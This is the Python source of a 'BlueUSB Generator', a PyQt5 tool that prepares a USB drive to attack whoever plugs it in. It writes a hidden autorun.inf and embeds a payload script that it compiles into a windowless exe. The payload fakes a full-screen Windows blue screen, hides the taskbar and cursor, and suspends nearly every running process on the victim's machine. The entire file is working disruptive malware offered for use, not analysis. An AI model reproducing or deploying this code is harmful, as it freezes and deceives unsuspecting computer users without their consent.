try:
    import sys
    from PyQt5 import QtCore, QtGui, QtWidgets, uic
    from PyQt5.QtCore import pyqtSlot, QObject
    from PyQt5.QtWidgets import QAction
    import easygui
    from tkinter import *
    import ctypes
    from pathlib import Path
    import os
    import win32com.client
    import pythoncom
    from random import choice
    import string
    import win32api, win32con
    import subprocess
    from shutil import copyfile
    from threading import Thread
    import traceback
    import time
except Exception as e:
    print("Error while importing: " + str(e))
    import time
    time.sleep(60)

try:
    msgbox = ctypes.windll.user32.MessageBoxW

    class Ui_MainWindow(object):
        def setupUi(self, MainWindow):
            MainWindow.setObjectName("MainWindow")
            MainWindow.resize(538, 368)
            font = QtGui.QFont()
            font.setFamily("Kalinga")
            font.setPointSize(9)
            MainWindow.setFont(font)
            icon = QtGui.QIcon()
            icon.addPixmap(QtGui.QPixmap("icon.png"), QtGui.QIcon.Normal, QtGui.QIcon.Off)
            MainWindow.setWindowIcon(icon)
            MainWindow.setAnimated(False)
            MainWindow.setTabShape(QtWidgets.QTabWidget.Rounded)
            self.centralwidget = QtWidgets.QWidget(MainWindow)
            self.centralwidget.setObjectName("centralwidget")
            self.label = QtWidgets.QLabel(self.centralwidget)
            self.label.setGeometry(QtCore.QRect(10, 40, 521, 31))
            font = QtGui.QFont()
            font.setPointSize(20)
            font.setBold(True)
            font.setWeight(75)
            self.label.setFont(font)
            self.label.setAlignment(QtCore.Qt.AlignCenter)
            self.label.setObjectName("label")
            self.groupBox = QtWidgets.QGroupBox(self.centralwidget)
            self.groupBox.setGeometry(QtCore.QRect(10, 70, 181, 111))
            self.groupBox.setObjectName("groupBox")
            self.label_2 = QtWidgets.QLabel(self.groupBox)
            self.label_2.setGeometry(QtCore.QRect(10, 20, 141, 16))
            self.label_2.setObjectName("label_2")
            self.SelectPath = QtWidgets.QPushButton(self.groupBox)
            self.SelectPath.setGeometry(QtCore.QRect(50, 80, 75, 23))
            self.SelectPath.setObjectName("SelectPath")
            self.SelectedPath = QtWidgets.QLabel(self.groupBox)
            self.SelectedPath.setGeometry(QtCore.QRect(10, 40, 161, 41))
            self.SelectedPath.setAlignment(QtCore.Qt.AlignLeading|QtCore.Qt.AlignLeft|QtCore.Qt.AlignTop)
            self.SelectedPath.setWordWrap(True)
            self.SelectedPath.setObjectName("SelectedPath")
            self.label_3 = QtWidgets.QLabel(self.centralwidget)
            self.label_3.setGeometry(QtCore.QRect(215, 80, 121, 16))
            self.label_3.setObjectName("label_3")
            self.ReturnCode = QtWidgets.QLineEdit(self.centralwidget)
            self.ReturnCode.setGeometry(QtCore.QRect(340, 78, 191, 20))
            self.ReturnCode.setObjectName("ReturnCode")
            self.DontBlock = QtWidgets.QListWidget(self.centralwidget)
            self.DontBlock.setGeometry(QtCore.QRect(10, 200, 181, 131))
            self.DontBlock.setObjectName("DontBlock")
            self.AddProcess = QtWidgets.QPushButton(self.centralwidget)
            self.AddProcess.setGeometry(QtCore.QRect(4, 340, 91, 23))
            self.AddProcess.setObjectName("AddProcess")
            self.RemoveProcess = QtWidgets.QPushButton(self.centralwidget)
            self.RemoveProcess.setGeometry(QtCore.QRect(104, 340, 91, 23))
            self.RemoveProcess.setObjectName("RemoveProcess")
            self.label_4 = QtWidgets.QLabel(self.centralwidget)
            self.label_4.setGeometry(QtCore.QRect(10, 184, 171, 16))
            self.label_4.setObjectName("label_4")
            self.line = QtWidgets.QFrame(self.centralwidget)
            self.line.setGeometry(QtCore.QRect(200, 80, 20, 281))
            self.line.setFrameShape(QtWidgets.QFrame.VLine)
            self.line.setFrameShadow(QtWidgets.QFrame.Sunken)
            self.line.setObjectName("line")
            self.groupBox_2 = QtWidgets.QGroupBox(self.centralwidget)
            self.groupBox_2.setGeometry(QtCore.QRect(220, 100, 301, 81))
            self.groupBox_2.setObjectName("groupBox_2")
            self.bsoff = QtWidgets.QRadioButton(self.groupBox_2)
            self.bsoff.setGeometry(QtCore.QRect(10, 20, 41, 17))
            self.bsoff.setChecked(True)
            self.bsoff.setObjectName("bsoff")
            self.bs7 = QtWidgets.QRadioButton(self.groupBox_2)
            self.bs7.setGeometry(QtCore.QRect(60, 20, 91, 17))
            self.bs7.setObjectName("bs7")
            self.bs8 = QtWidgets.QRadioButton(self.groupBox_2)
            self.bs8.setGeometry(QtCore.QRect(160, 20, 111, 17))
            self.bs8.setObjectName("bs8")
            self.bs10 = QtWidgets.QRadioButton(self.groupBox_2)
            self.bs10.setGeometry(QtCore.QRect(90, 40, 91, 17))
            self.bs10.setObjectName("bs10")
            self.label_5 = QtWidgets.QLabel(self.groupBox_2)
            self.label_5.setGeometry(QtCore.QRect(20, 60, 281, 20))
            font = QtGui.QFont()
            font.setPointSize(7)
            self.label_5.setFont(font)
            self.label_5.setObjectName("label_5")
            self.label_6 = QtWidgets.QLabel(self.centralwidget)
            self.label_6.setGeometry(QtCore.QRect(220, 200, 101, 16))
            self.label_6.setObjectName("label_6")
            self.label_7 = QtWidgets.QLabel(self.centralwidget)
            self.label_7.setGeometry(QtCore.QRect(220, 220, 311, 71))
            palette = QtGui.QPalette()
            brush = QtGui.QBrush(QtGui.QColor(74, 74, 74))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(74, 74, 74))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.WindowText, brush)
            brush = QtGui.QBrush(QtGui.QColor(120, 120, 120))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.WindowText, brush)
            self.label_7.setPalette(palette)
            font = QtGui.QFont()
            font.setPointSize(8)
            self.label_7.setFont(font)
            self.label_7.setFrameShape(QtWidgets.QFrame.NoFrame)
            self.label_7.setFrameShadow(QtWidgets.QFrame.Raised)
            self.label_7.setLineWidth(-3)
            self.label_7.setMidLineWidth(-3)
            self.label_7.setTextFormat(QtCore.Qt.AutoText)
            self.label_7.setScaledContents(True)
            self.label_7.setAlignment(QtCore.Qt.AlignHCenter|QtCore.Qt.AlignTop)
            self.label_7.setWordWrap(True)
            self.label_7.setTextInteractionFlags(QtCore.Qt.NoTextInteraction)
            self.label_7.setObjectName("label_7")
            self.NiceModeTime = QtWidgets.QSpinBox(self.centralwidget)
            self.NiceModeTime.setGeometry(QtCore.QRect(316, 197, 211, 22))
            self.NiceModeTime.setMaximum(69)
            self.NiceModeTime.setObjectName("NiceModeTime")
            self.check2 = QtWidgets.QCheckBox(self.centralwidget)
            self.check2.setGeometry(QtCore.QRect(220, 290, 311, 17))
            font = QtGui.QFont()
            font.setFamily("Kalinga")
            font.setPointSize(8)
            self.check2.setFont(font)
            self.check2.setChecked(True)
            self.check2.setObjectName("check2")
            self.generate = QtWidgets.QPushButton(self.centralwidget)
            self.generate.setEnabled(True)
            self.generate.setGeometry(QtCore.QRect(280, 320, 181, 31))
            palette = QtGui.QPalette()
            brush = QtGui.QBrush(QtGui.QColor(47, 250, 1))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Active, QtGui.QPalette.ButtonText, brush)
            brush = QtGui.QBrush(QtGui.QColor(47, 250, 1))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Inactive, QtGui.QPalette.ButtonText, brush)
            brush = QtGui.QBrush(QtGui.QColor(120, 120, 120))
            brush.setStyle(QtCore.Qt.SolidPattern)
            palette.setBrush(QtGui.QPalette.Disabled, QtGui.QPalette.ButtonText, brush)
            self.generate.setPalette(palette)
            font = QtGui.QFont()
            font.setPointSize(12)
            self.generate.setFont(font)
            self.generate.setCheckable(False)
            self.generate.setObjectName("generate")
            self.jujruwjer923rrj3943493403 = QtWidgets.QLabel(self.centralwidget)
            self.jujruwjer923rrj3943493403.setGeometry(QtCore.QRect(473, 7, 61, 16))
            self.jujruwjer923rrj3943493403.setObjectName("jujruwjer923rrj3943493403")
            self.label_8 = QtWidgets.QLabel(self.centralwidget)
            self.label_8.setGeometry(QtCore.QRect(240, 0, 61, 51))
            self.label_8.setText("")
            self.label_8.setPixmap(QtGui.QPixmap("icon.png"))
            self.label_8.setScaledContents(True)
            self.label_8.setObjectName("label_8")
            MainWindow.setCentralWidget(self.centralwidget)

            self.retranslateUi(MainWindow)
            self.SelectPath.clicked.connect(selectpath)
            self.AddProcess.clicked.connect(addproc)
            self.RemoveProcess.clicked.connect(removeproc)
            self.generate.clicked.connect(generate)
            QtCore.QMetaObject.connectSlotsByName(MainWindow)

        def retranslateUi(self, MainWindow):
            _translate = QtCore.QCoreApplication.translate
            MainWindow.setWindowTitle(_translate("MainWindow", "BlueUSB Generator"))
            self.label.setText(_translate("MainWindow", "BlueUSB Generator"))
            self.groupBox.setTitle(_translate("MainWindow", "Path"))
            self.label_2.setText(_translate("MainWindow", "Currently selected path:"))
            self.SelectPath.setText(_translate("MainWindow", "Select path"))
            self.SelectedPath.setText(_translate("MainWindow", "None"))
            self.label_3.setText(_translate("MainWindow", "Return code (Win10):"))
            self.ReturnCode.setText(_translate("MainWindow", "Couldn\'t bind to remote port"))
            self.AddProcess.setText(_translate("MainWindow", "Add process"))
            self.RemoveProcess.setText(_translate("MainWindow", "Remove proc"))
            self.label_4.setText(_translate("MainWindow", "Don\'t block these processes:"))
            self.groupBox_2.setTitle(_translate("MainWindow", "Force a specific Windows Bluescreen:"))
            self.bsoff.setText(_translate("MainWindow", "Off"))
            self.bs7.setText(_translate("MainWindow", "Windows 7"))
            self.bs8.setText(_translate("MainWindow", "Windows 8/8.1"))
            self.bs10.setText(_translate("MainWindow", "Windows 10"))
            self.label_5.setText(_translate("MainWindow", "If it\'s off, it will bluescreen with the correct version of Windows."))
            self.label_6.setText(_translate("MainWindow", "Nice mode time:"))
            self.label_7.setText(_translate("MainWindow", "Nice mode will stop the bluescreen after the selected time. Set to 0 to disable \"Nice mode\". Setting the value to 1 or more will cause processes to not be suspended."))
            self.NiceModeTime.setSuffix(_translate("MainWindow", " seconds"))
            self.check2.setText(_translate("MainWindow", "I have read and agree with the license"))
            self.generate.setText(_translate("MainWindow", "Generate!"))
            self.jujruwjer923rrj3943493403.setText(_translate("MainWindow", "By Cyclip"))

    processes = []

    alph = list(string.ascii_uppercase + string.ascii_lowercase + string.digits)

    @QtCore.pyqtSlot()
    def selectpath():
        try:
            newpath = easygui.diropenbox();print("STAGE")
            if newpath == '' or newpath == None:
                return
            print("STAGE")
            ui.SelectedPath.setText(newpath);print("STAGE")
        except Exception as e:
            print(str(e))

    @QtCore.pyqtSlot()
    def addproc():
        ui.AddProcess.setEnabled(False)
        procname = easygui.enterbox(msg='Process name:',
                                    title = 'Add Process',
                                    default = 'program.exe')
        if procname == None or procname == '':
            return

        ui.DontBlock.addItem(procname)
        processes.append(procname)
        ui.AddProcess.setEnabled(True)

    @QtCore.pyqtSlot()
    def removeproc():
        try:
            ui.RemoveProcess.setEnabled(False)
            row = ui.DontBlock.currentRow()
            name = ui.DontBlock.currentItem().text()
            prompt = msgbox(0, 'Are you sure you want to remove {}?'.format(name), 'Remove process', 4)
            if prompt == 6: #yes
                ui.DontBlock.takeItem(row)
                processes.remove(name)
            ui.RemoveProcess.setEnabled(True)
        except Exception as e:
            print("Error: " + str(e))
            ui.RemoveProcess.setEnabled(True)

    def almost():
        msgbox(0, '''Almost there, the exe is being created.
    The source code/original .py file will still remain.

    BlueUSB is created and maintained by Cyclip''',
               'Almost there..', 0x8000000)

    @QtCore.pyqtSlot()
    def generate():
        try:
            path = ui.SelectedPath.text()

            if path == 'None' or path == None:
                path = os.getcwd()

            if path[-1] in alph:
                path = path + '/'

            if ui.check2.isChecked() == True:
                pass
            else:
                msgbox(0, 'You need to agree to the license.', 'Generation aborted', 16)
                return
            ui.generate.setEnabled(False)
            ui.SelectPath.setEnabled(False)
            ui.AddProcess.setEnabled(False)
            ui.RemoveProcess.setEnabled(False)
            ui.check2.setEnabled(False)
            ui.NiceModeTime.setEnabled(False)
            ui.ReturnCode.setEnabled(False)

            uniquecode = []
            for i in range(16):
                uniquecode.append(choice(alph))
            uniquecode = ''.join(uniquecode)

            #get options
            dontblockprocesses = processes

            if ui.bsoff.isChecked():
                forcetype = 'DISABLED'
            elif ui.bs7.isChecked():
                forcetype = '7'
            elif ui.bs8.isChecked():
                forcetype = '8'
            elif ui.bs10.isChecked():
                forcetype = '10'
            else:
                forcetype = 'DISABED'


            nicemodetime = ui.NiceModeTime.value()

            returncode = ui.ReturnCode.text().replace("'", '')

            if os.path.isfile(path + 'autorun.inf'):
                prompt = msgbox(0, '''The files are already in this directory.
        Do you want to remove and overwrite these files?''', 'File already exists', 4)
                if prompt == 6:
                    os.remove(path + 'autorun.inf')
                else:
                    msgbox(0, 'Generation aborted', 'Oof', 0x800000)
                    ui.generate.setEnabled(True);ui.SelectPath.setEnabled(True);ui.AddProcess.setEnabled(True);ui.RemoveProcess.setEnabled(True);ui.check2.setEnabled(True);ui.NiceModeTime.setEnabled(True);ui.ReturnCode.setEnabled(True)
                    return

            templateautorun = """[autorun]
    ;Open={}
    ShellExecute={}
    UseAutoPlay=1"""

            Path(path + 'autorun.inf').touch()
            Path(path + uniquecode + '.py').touch()

            with open(path + 'autorun.inf', 'w') as f:
                f.write(templateautorun.format(
                    uniquecode + '.lnk',
                    uniquecode + '.lnk'))

            win32api.SetFileAttributes(path + 'autorun.inf',win32con.FILE_ATTRIBUTE_HIDDEN)
            win32api.SetFileAttributes(path + 'autorun.inf',win32con.FILE_ATTRIBUTE_READONLY)

            code = """\n###############################\n#\nreturncode = '{}'\ndontblock = '{}'\nforcetype = '{}'\nnicemodetime = '{}'\n#\n###############################\n\nfrom tkinter import *\nimport ctypes\nfrom ctypes import wintypes\n\nimport psutil\nimport time\n\nfrom threading import Thread\nimport platform\n\n#------------------------------------------------------------------------------\n\ncoredb = "csrss.exe,lsass.exe,CxAudMsg64.exe,System,System Idle Process,System interrupts, taskhost.exe, taskhostex.exe".replace('\\n', ',').split(',')\n\ndontblock = dontblock.replace('\\n', ',').split(',')\n\nfor core in coredb:\n    dontblock.append(core)\n\nversion = platform.release()\n\nif nicemodetime == '0':\n    nicemode = False\nelse:\n    nicemode = True\n\n#------------------------------------------------------------------------------\n\nuser32 = ctypes.WinDLL("user32")\n\nSW_HIDE = 0\nSW_SHOW = 5\n\nuser32.FindWindowW.restype = wintypes.HWND\nuser32.FindWindowW.argtypes = (\n    wintypes.LPCWSTR, # lpClassName\n    wintypes.LPCWSTR) # lpWindowName\n\nuser32.ShowWindow.argtypes = (\n    wintypes.HWND, # hWnd\n    ctypes.c_int)  # nCmdShow\n\n#------------------------------------------------------------------------------\n\ndef blockproc():\n    if nicemode == True:\n        return\n    processes = []\n    for proc in psutil.process_iter():\n        if not proc.name() in dontblock:\n            try:\n                psutil.Process(proc.pid).suspend()\n            except:\n                pass\n\n#------------------------------------------------------------------------------\n\ndef benice():\n    time.sleep(int(nicemodetime) + 1)\n    root.destroy()\n    unhide_taskbar()\n\n#------------------------------------------------------------------------------\n\ndef hide_taskbar():\n    hWnd = user32.FindWindowW(u"Shell_traywnd", None)\n    user32.ShowWindow(hWnd, SW_HIDE)\n\n#------------------------------------------------------------------------------\n\ndef windows7():\n    global killproc\n    killproc = Thread(target=blockproc)\n    killproc.daemon = True\n    killproc.start()\n    global root\n    root = Tk()\n    root.title("BSOD")\n    root.resizable(0, 0)\n    #root.overrideredirect(1)\n    root.lift()\n    root.attributes("-fullscreen", True)\n    root.attributes("-topmost", True)\n    root.focus_force()\n\n    root.configure(bg='#0100A6', cursor='none')\n\n    labeltext = \"\"\"\n A problem has been detected and Windows has been shut down to prevent damage to your computer.\n\n The problem seems to be caused by the following file: csrss.exe\n\n PANIC_STACK_SWITCH\n\n If this is the first time you've seen this Stop error screen,")\n restart your computer. If this screen appears again, follow these steps:\n\n\n Check to make sure any new hardwarea or software is properly installed.\n If this is a new installation, ask your hardware or software manufacturer\n for any Windows updates you might need.\n\n If problems continue, disable or remove any newly installed hardware\n or software. Disable BIOS memory options such as cachine or shadowiing.\n If you need to use Safe Mode to remove or disable components, restart\n your computer, press F8 to select Advanced Startup options, and then\n select Safe Mode.\n\n Technical information:\n\n *** STOP: 0x000000EA (0x00000000, 0x00000000)\"\"\"\n\n    Label(root, fg='#ffffff', bg='#0100A6', font = 'Consolas 19', justify='left', anchor='w', text=labeltext, wraplength=1400).pack(fill='both')\n\n    root.after(1, lambda: root.focus_force())\n\n    hide_taskbar()\n    \n    root.mainloop()\n\n#------------------------------------------------------------------------------\n\ndef windows8():\n    global killproc\n    killproc = Thread(target=blockproc)\n    killproc.daemon = True\n    killproc.start()\n    global root\n    root = Tk()\n    root.title("BSOD")\n    root.resizable(0, 0)\n    #root.overrideredirect(1)\n    root.lift()\n    root.attributes("-fullscreen", True)\n    root.attributes("-topmost", True)\n    root.focus_force()\n\n    root.configure(bg='#1965B3', cursor='none')\n\n    Label(root, fg='#ffffff', bg='#1965B3', font = ("Segoe UI", 100),justify='left', anchor='w',wraplength=1400,\n          text='\\n      :(').pack(fill='both')\n\n    Label(root, fg='#ffffff', bg='#1965B3', font = ("Segoe UI", 25),justify='left', anchor='w',wraplength=1400,\n          text=\"\"\"                         Your PC ran into a problem and needs to restart. We're just\n                         collecting some error info, and then you can restart. (0%\n                         complete)\"\"\").pack(fill='both')\n\n    Label(root, fg='#ffffff', bg='#1965B3', font = ("Segoe UI", 10),justify='left', anchor='w',\n          text=\"\"\"\n\n\n\\t\\t\\t\\t If you'd like to know more, you can search online later for this error: CLOCK_WATCHDOG_TIMEOUT\"\"\").pack(fill='both')\n\n    root.mainloop()\n\n#------------------------------------------------------------------------------\n\ndef windows10():\n    global killproc\n    killproc = Thread(target=blockproc)\n    killproc.daemon = True\n    killproc.start()\n    #0177D7\n    global root\n    root = Tk()\n    root.title("BSOD")\n    root.resizable(0, 0)\n    #root.overrideredirect(1)\n    root.lift()\n    root.attributes("-fullscreen", True)\n    root.attributes("-topmost", True)\n    root.focus_force()\n\n    root.configure(bg='#1070AA', cursor='none')\n\n    Label(root, fg='#ffffff', bg='#1070AA', font = ("Segoe UI", 95),justify='left', anchor='w',wraplength=1400,\n          text='\\n      :(').pack(fill='both')\n\n    Label(root, fg='#ffffff', bg='#1070AA', font = ("Segoe UI", 25),justify='left', anchor='w',wraplength=1400,\n          text=\"\"\"                         Your PC ran into a problem and needs to restart. We're just\n                         collecting some error info, and then we'll restart for you.\n\n                        0% complete\"\"\").pack(fill='both')\n\n    Label(root, fg='#ffffff', bg='#1070AA', font = ("Segoe UI", 10),justify='left', anchor='w',\n          text=\"\"\"\n\n\n\\t\\t\\t\\t If you'd like to know more, you can search online later for this error: CLOCK_WATCHDOG_TIMEOUT\n\\t\\t\\t\\t What failed: System.exe\n\\t\\t\\t\\t Return code: \"\"\" + returncode).pack(fill='both')\n\n    root.mainloop()\n\n#------------------------------------------------------------------------------\n\ndef unhide_taskbar():\n    hWnd = user32.FindWindowW(u"Shell_traywnd", None)\n    user32.ShowWindow(hWnd, SW_SHOW)\n\n#------------------------------------------------------------------------------\n\nif nicemode == False:\n    pass\nelse:\n    nicemodethr = Thread(target=benice)\n    nicemodethr.daemon = True\n    nicemodethr.start()\n\nhide_taskbar()\n\nif forcetype == 'DISABLED':\n    if version == '7':\n        windows7()\n    elif version == '8' or version == '8.1':\n        windows8()\n    elif version == '10':\n        windows10()\n    else:\n        windows8()\nelse:\n    if forcetype == '7':\n        windows7()\n    elif forcetype == '8' or forcetype == '8.1':\n        windows8()\n    elif forcetype == '10':\n        windows10()\n    else:\n        windows8()\n\n#------------------------------------------------------------------------------\n"""

            with open(path + uniquecode + '.py', 'w') as f:
                f.write(code.format(returncode,
                                    ','.join(dontblockprocesses),
                                    forcetype,
                                    str(nicemodetime)))

            assure = Thread(target=almost)
            assure.daemon = True
            assure.start()

            a = subprocess.call('pyinstaller --noconsole {}{}.py'.format(path,uniquecode),
                                shell=True, creationflags=0x08000000)

            try:
                desktop = path # path to where you want to put the .lnk
                lnkpath = path + '{}.lnk'.format(uniquecode)
                target = '{}/dist/{}.exe'.format(path,uniquecode)

                shell = win32com.client.Dispatch("WScript.Shell")
                shortcut = shell.CreateShortCut(path)
                shortcut.Targetpath = target
                shortcut.WindowStyle = 7 # 7 - Minimized, 3 - Maximized, 1 - Normal
                shortcut.save()
            except Exception as e:
                msgbox(0, '''Partially created! Before you exit, please read.
    An error occured while creating the shortcut.
    Follow these steps to make sure the
    program will be functional:

    1) Go to the path/folder you selected
    2) Go to the folder 'dist'
    3) Scroll down until you find {}.exe
    4) Right click the exe
    5) Send to > Desktop (Shortcut)
        Or manually create a shortcut
    6) Move the shortcut to the path/folder
       you selected.

    Error: {} (Returned {})'''.format(uniquecode, str(e), str(a)))

            msgbox(0, 'Successfully created!\nEXE return: ' + str(a), 'Generation completed', 0x8000000)
            ui.generate.setEnabled(True);ui.SelectPath.setEnabled(True);ui.AddProcess.setEnabled(True);ui.RemoveProcess.setEnabled(True);ui.check2.setEnabled(True);ui.NiceModeTime.setEnabled(True);ui.ReturnCode.setEnabled(True)
        except Exception as e:
            print("Error: " + str(e))
            msgbox(0, str(e), str(e), 16)
            ui.generate.setEnabled(True);ui.SelectPath.setEnabled(True);ui.AddProcess.setEnabled(True);ui.RemoveProcess.setEnabled(True);ui.check2.setEnabled(True);ui.NiceModeTime.setEnabled(True);ui.ReturnCode.setEnabled(True)

    import sys
    app = QtWidgets.QApplication(sys.argv)
    MainWindow = QtWidgets.QMainWindow()
    ui = Ui_MainWindow()
    ui.setupUi(MainWindow)
    MainWindow.show()
    sys.exit(app.exec_())
except Exception as e:
    error = traceback.format_exc()
    try:
        msgbox(0, 'There was an error:\n' + error, 'Fatal error', 16)
    except Exception as e:
        error2 = traceback.format_exc()
        print("""There was an error while handling another error:
Original error:
{}

Handling error (Msgbox notification):
{}""".format(error,error2))
        time.sleep(50)
